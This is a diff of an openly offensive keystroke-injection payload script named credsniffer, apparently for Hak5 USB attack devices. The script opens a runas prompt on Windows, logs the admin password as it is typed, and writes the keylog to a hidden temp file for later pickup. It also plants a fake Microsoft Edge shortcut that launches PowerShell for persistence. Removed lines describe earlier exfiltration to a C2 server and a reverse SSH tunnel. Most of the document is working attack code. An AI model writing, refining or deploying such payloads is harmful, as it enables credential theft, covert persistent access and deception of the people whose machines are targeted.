@@ -1,10 +1,10 @@
 ###############################KeyLogin#####################################
-#   Version 2.0
+#   Version 3.0
 #   OS: Windows 10/11
 #   Author: 0i41E (modified)
-#   Description: Locks target machine, captures login password via keystroke
-#   interception, exfiltrates to custom C2 via KeyCroc WiFi (no RNDIS needed),
-#   then injects a reverse SSH tunnel for persistent RDP access — no admin required.
+#   Description: Captures admin credentials via runas console prompt,
+#   drops raw keylog to Windows %TEMP%\.sysinfo for Bash Bunny pickup,
+#   and plants a fake Microsoft Edge shortcut on H:\Desktop for persistence.
 #
 ####################Config###################################################
 
@@ -26,12 +26,12 @@ log() {
     echo "[$(date +%H:%M:%S)] [$level] $*" | tee -a "$LOG_FILE"
 }
 
-log INFO "=== credsniffer payload started ==="
-log INFO "C2_IP=$C2_IP C2_PORT=$C2_PORT C2_SSH_USER=$C2_SSH_USER"
+log INFO "=== credsniffer v3.0 payload started ==="
+log INFO "RUNAS_USER=$RUNAS_USER | DUCKY_LANG=$DUCKY_LANG"
 
 ####################Trigger & Clean Up#######################################
-# IMPORTANT: Only deploy this on a Windows machine at login screen.
-# If triggered elsewhere (BIOS, Linux, etc.), this will freeze keyboard passthrough.
+# IMPORTANT: Works best on a logged-in Windows session.
+# The runas console prompt will not appear on a lock screen.
 # Uncomment one trigger strategy:
 
 # Strategy 1: Simple — fires on any ENTER (risky, can trigger mid-session)
@@ -46,7 +46,7 @@ MATCH \[ENTER\]
 [ -f /tmp/creds_lock ] && exit 0
 touch /tmp/creds_lock
 
-log INFO "STEP 1: Trigger fired — cleaning old loot"
+log INFO "STEP 1: Trigger fired — one-shot lock acquired, cleaning old loot"
 rm -f /root/loot/win-pass*
 
 ########################Capture Admin Credentials via runas##################
@@ -57,7 +57,7 @@ rm -f /root/loot/win-pass*
 # Set RUNAS_USER above. On domain PCs use DOMAIN\\Administrator.
 # Find domain with: whoami (output is DOMAIN\username)
 
-log INFO "STEP 2: Sending HID — opening Run dialog for runas password prompt"
+log INFO "STEP 2: HID — Win+R → runas /user:$RUNAS_USER cmd"
 Q DELAY 1000
 
 # Open Run dialog and launch runas — spawns a console asking for the password
@@ -73,9 +73,10 @@ Q DELAY 1200
 log INFO "STEP 3: Starting SAVEKEYS capture (50 keys, background)"
 SAVEKEYS /root/loot/win-pass.txt NEXT 50 &
 echo $! > /tmp/savekeys.pid
+log INFO "STEP 3: SAVEKEYS started (pid=$(cat /tmp/savekeys.pid)) — waiting for user to type password into runas console"
 
 # Poll for capture completion — UAC credential entry happens here
-log INFO "STEP 4: Polling for SAVEKEYS output (max 30s)..."
+log INFO "STEP 4: Polling for SAVEKEYS output (30s max, 0.5s interval)..."
 for i in {1..60}; do
     [ -f /root/loot/win-pass.txt ] && { log INFO "Capture file appeared after $((i/2))s"; break; }
     sleep 0.5
@@ -83,17 +84,17 @@ done
 
 # Bail out gracefully if nothing was captured (user dismissed UAC, or was already admin)
 if [ ! -f /root/loot/win-pass.txt ]; then
-    log ERROR "STEP 4 FAILED: No credential captured — user may have dismissed the runas console, or RUNAS_USER ($RUNAS_USER) does not exist on this machine."
+    log ERROR "STEP 4 FAILED: Timed out — user dismissed runas console, or RUNAS_USER='$RUNAS_USER' not found on this machine."
     exit 1
 fi
-log INFO "STEP 4 OK: Credential file captured ($(wc -c < /root/loot/win-pass.txt) bytes)"
+log INFO "STEP 4 OK: Capture complete — $(wc -c < /root/loot/win-pass.txt) bytes, $(wc -l < /root/loot/win-pass.txt) lines"
 
 #####################Drop Keylog to Windows Temp############################
 # Write the raw captured keylog to a predictable Windows temp path.
 # Bash Bunny (plugged in later in STORAGE mode) can read and exfil this file.
 # File: %TEMP%\.sysinfo  (expands to C:\Users\<user>\AppData\Local\Temp\.sysinfo)
 
-log INFO "STEP 5: Writing keylog to Windows temp for Bash Bunny pickup"
+log INFO "STEP 5: Dropping keylog to Windows %%TEMP%%\.sysinfo for Bash Bunny pickup"
 # Escape backticks so they survive inside a PowerShell double-quoted string
 RAW_KEYS=$(sed "s/\`/\`\`/g" /root/loot/win-pass.txt | tr -d '\n')
 
@@ -108,14 +109,14 @@ Q ENTER
 Q DELAY 400
 Q STRING exit
 Q ENTER
-log INFO "STEP 5 OK: Keylog write command sent — Bash Bunny target: %TEMP%\\.sysinfo"
+log INFO "STEP 5 OK: Drop command sent — Bash Bunny reads %%TEMP%%\.sysinfo after plugging in"
 
 #####################Fake Microsoft Edge Shortcut###########################
 # Creates a shortcut on H:\Desktop named "Microsoft Edge" that actually opens
 # a terminal. The icon is pulled from the real msedge.exe so it looks legit.
 # Replace the echo payload with a real POST/SSH command when ready.
 
-log INFO "STEP 6: Creating fake Microsoft Edge shortcut on H:\\Desktop"
+log INFO "STEP 6: Planting fake Microsoft Edge shortcut on H:\\Desktop"
 Q DELAY 1500
 Q GUI r
 Q DELAY 600
@@ -127,10 +128,10 @@ Q ENTER
 Q DELAY 400
 Q STRING exit
 Q ENTER
-log INFO "STEP 6 OK: Fake Edge shortcut created on H:\\Desktop"
+log INFO "STEP 6 OK: Shortcut planted — clicking it opens PowerShell payload"
 
 Q DELAY 1000
-log INFO "=== credsniffer payload finished — log at $LOG_FILE ==="
+log INFO "=== credsniffer v3.0 finished — loot at /root/loot/ | log: $LOG_FILE ==="
 
 #You may want to delete or disable the payload after execution to avoid re-triggering
 #rm /root/udisk/payloads/credsniffer.txt
